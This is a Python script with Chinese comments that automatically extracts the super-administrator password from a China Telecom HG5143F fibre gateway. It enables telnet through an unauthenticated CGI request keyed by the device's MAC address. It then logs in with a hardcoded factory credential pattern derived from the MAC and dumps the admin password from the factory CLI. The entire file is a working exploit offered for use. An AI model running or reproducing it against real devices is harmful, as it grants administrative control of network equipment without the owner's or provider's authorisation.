# coding=utf-8

# AGPLv3+ License. By Gxxk(Frez79).
# 全自动获取 电信网关HG5143F(ONU) 的超管密码.
# 仅在Win10LTSC2021/Py3.12.6上测试通过.
# 基于此教程编写：https://blog.csdn.net/weixin_45736958/article/details/135500085
# 导入模块
try:
    import os,re,requests,telnetlib,time
except ModuleNotFoundError:
    raise ModuleNotFoundError("请安装requests库并确保Python版本低于Py3.12!")


print("全自动获取 电信网关HG5143F(ONU) 的超管密码.")
print("HG5143F(ONU) v4.10.M5001测试有效")
print("\t\tBy Gxxk.")

tnCmdDelay="0.5" if (value:=input("Telnet命令执行延迟(单位秒)(0.5s):"))=="" else value # 命令执行延迟
try:tnCmdDelay=float(tnCmdDelay)
except:
    raise ValueError("请输入一个正确的值")
# 网关信息获取
ip="192.168.1.1" if (ip:=input("网关IP(192.168.1.1):"))=="" else ip
mac=os.popen(f"arp -a {ip}").read().upper() # ARP信息获取
mac=re.search("[A-F0-9]{2}(-[A-F0-9]{2}){5}",mac).group().replace("-","")# 匹配
print(f"网关MAC: {mac}.")

# 开启网关Telnet
requestStat=requests.get(f"http://{ip}:8080/cgi-bin/telnetenable.cgi?key={mac}&telnetenable=1")
if requestStat.status_code!=200:
    raise Exception("无法开启Telnet! 请检查型号/版本是否符合")

with telnetlib.Telnet(ip,port=23) as tn:
    tnUsername="telnetadmin" #Telnet用户名
    tnPwd=f"FH-nE7jA%5m{mac[-6:]}" # Telnet密码
    time.sleep(tnCmdDelay) # 人机玩意有延迟
    
    tn.write(f"{tnUsername}\n".encode())
    print(f"输入用户名：{tnUsername}")
    time.sleep(tnCmdDelay)
    
    tn.write(f"{tnPwd}\n".encode())
    print(f"输入密码：{tnPwd}")
    time.sleep(tnCmdDelay)
    
    tn.write(b"load_cli factory\nshow admin_pwd\n")
    print("尝试获取超密...")
    time.sleep(tnCmdDelay)
    tnContent=tn.read_very_eager().decode('ascii')


    output=re.search(r"telecomadmin\d{8}",tnContent)
    print(f"TelnetLog:\n{tnContent}\n")
    if output:
        print(f"获取成功. 超密:{output.group()}")
    else:
        print("未能获取超密,请检查 版本/型号 或再试一次.或许可以跟着教程手动走一遍？\n教程：https://blog.csdn.net/weixin_45736958/article/details/135500085")

